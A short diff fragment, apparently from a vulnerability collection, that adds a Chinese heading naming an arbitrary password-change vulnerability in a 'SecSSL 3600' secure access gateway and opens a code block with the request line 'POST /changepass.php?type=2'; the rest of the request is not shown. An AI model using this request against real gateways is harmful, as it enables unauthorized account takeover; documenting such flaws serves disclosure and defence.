@@ -1,3 +1,5 @@
+
+## 某神 SecSSL 3600安全接入网关系统 任意密码修改漏洞
 ```
 POST /changepass.php?type=2 
 
